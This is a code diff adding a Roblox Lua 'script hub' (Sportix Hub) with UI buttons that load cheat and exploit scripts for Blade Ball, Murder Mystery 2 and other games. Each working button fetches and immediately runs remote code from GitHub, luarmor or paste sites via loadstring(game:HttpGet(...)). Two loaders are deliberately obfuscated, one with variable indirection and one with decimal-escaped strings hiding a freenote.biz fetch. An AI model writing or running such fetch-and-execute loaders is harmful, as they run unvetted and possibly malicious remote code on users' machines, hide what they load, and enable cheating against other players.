@@ -1,0 +1,263 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Sportix Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "Blade Ball Scripts"
+})
+OrionLib:MakeNotification({
+	Name = "Sportix Hub",
+	Content = "Credits to Bert Loaf",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+Tab:AddButton({
+	Name = "FFJ V3",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/BladeBallV3.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Ether Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/6w0s/_6w0s/main/Loader.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Infinix Hub",
+	Callback = function()
+	local __function = loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))
+
+__function(__function)
+      		print("button pressed")
+  	end
+  
+  })
+  Tab:AddButton({
+	Name = "Rac Hub (Patched)",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/doitenroi1/Main/main/RacHub.lua"))();
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Private Hub",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doitenroi1/private/main/private"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Astra Hub",
+	Callback = function()
+        loadstring(game:HttpGet("https://code4zaa.xyz/script/script-loader.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "No Gui Auto Parry",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/datshort1/AutoParryGod/main/main"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Goose Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Orangecatgamer696969/Goose-hub-blade-ball/main/Script", true))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Mew Hub",
+	Callback = function()
+	--//Psalms 118:6
+local a = "https://freenote.biz/raw/cdt90nwmiv"
+local b = game
+local c = "HttpGet"
+local d = true
+local e = loadstring
+local f = b[c](b, a, d)
+e(f)()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Milenio x Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Nearz1/Milenio-X-Hub/main/Universal%20FE"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "R4mpage Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/7Scripts/main/BladeBalls"))();
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Visual Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ab6906cda6641c69a5f3a6c0c2ad6d80.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Auto Parry Only",
+	Callback = function()
+	loadstring(game:HttpGet("https://github.com/Stang001/pulawat/blob/main/BladeBall.lua?raw=true"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Bacon Hub",
+	Callback = function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconScriptHub/BaconHub/main/BaconHubBladeBall.lua.txt'))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Bleach Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/00975f50438ccfe5ba5c700504abd480.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "SumitScripts",
+	Callback = function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/SumitScripts/Blade-ball/main/SumitScripts/Loader.lua'))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Neverlose Hub",
+	Callback = function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\102\114\101\101\110\111\116\101\46\98\105\122\47\114\97\119\47\110\102\122\48\122\113\100\121\117\110\34\41\41\40\41\10")()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "LN Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV2.lua"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Auto Parry only 2",
+	Callback = function()
+	xpcall(function()
+loadstring(game:HttpGet("https://github.com/Stang001/pulawat/blob/main/BladeBall.lua?raw=true"))()
+end,function()
+warn("Script error!")
+end)
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Plutonuim",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Schema Hub",
+	Callback = function()	
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/manimanni/Schema/main/posse.lua"))()
+      		print("button pressed")
+  	end    
+
+})
+Tab:AddButton({
+	Name = "DDZC v2 hub",
+	Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Atreus-Hub/DenDenZ-Creationz/main/KeyRBLX%20BladeBall"))()
+      		print("button pressed")
+  	end   
+
+})
+local Section = Tab:AddSection({
+	Name = "Murder Mystery 2 Scripts"
+})
+Tab:AddButton({
+	Name = "Eclipse Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1nx/MurderMystery2ScriptTESTING/main/TestFile"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Yarhm Hub",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "R3th hub",
+	Callback = function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Highlight Hub Key: hlvipcomingsoon",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
+      		print("button pressed")
+  	end    
+  
+})
+Tab:AddButton({
+	Name = "Fe Hubs",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
+local Tab = Window:MakeTab({
+	Name = "Fe Hubs",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "Fe Hubs"
+})
+Tab:AddButton({
+	Name = "Animation Changer",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
+      		print("button pressed")
+  	end    
+  
+})
+OrionLib:Init()
